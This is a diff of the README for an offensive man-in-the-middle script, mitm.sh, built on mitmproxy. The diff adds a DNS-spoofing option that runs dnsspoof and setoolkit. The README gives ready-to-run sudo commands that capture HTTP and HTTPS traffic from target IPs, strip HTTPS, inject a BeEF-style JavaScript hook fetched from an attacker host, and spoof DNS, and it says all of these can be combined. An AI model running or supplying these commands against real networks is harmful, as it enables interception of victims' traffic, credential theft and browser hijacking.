@@ -3,12 +3,13 @@ MITM ATTACK WITH HTTP PROXYING (using [MITMPROXY](http://docs.mitmproxy.org/en/s
   
 You can run  **mitm.sh**:  
 ```bash
-Usage: ./mitm.sh [-g] [-n] [-s] [-x] [-j] <js payload url> [-i] <interface> ip_target1 ip_target2
+Usage: ./mitm.sh [-g] [-n] [-s] [-x] [-j] <js payload url> [-d] [-i] <interface> ip_target1 ip_target2
        [-g] interactive mode for mitmproxy
        [-n] capture HTTP traffic
        [-s] capture HTTPS traffic
        [-x] stripping https
        [-j] inject js payload
+       [-d] dnsspoof + setoolkit
        [-i] interface
 ```  
 **/!\ Working with Mitmproxy v1.0. Mitmproxy will be automatically downloaded and installed.**  
@@ -23,6 +24,13 @@ You also can inject a javascript payload (for example Beef payload):
 ```
 sudo ./mitm.sh -g -n -j http://192.168.1.10:3000/hook.js -i wlan0 192.168.1.1 192.168.1.11
 ```
+  
+Or run a DNS spoofing attack (will run dnsspoof and setoolkit):  
+```
+sudo ./mitm.sh -g -n -d -i wlan0 192.168.1.1 192.168.1.11
+```
+  
+Of course you can run all these features together.  
   
 While intercepting trafic, we also aims at:
  - Dropping the following request headers: *If-Modified-Since*,*Cache-Control*,*Upgrade-Insecure-Requests*
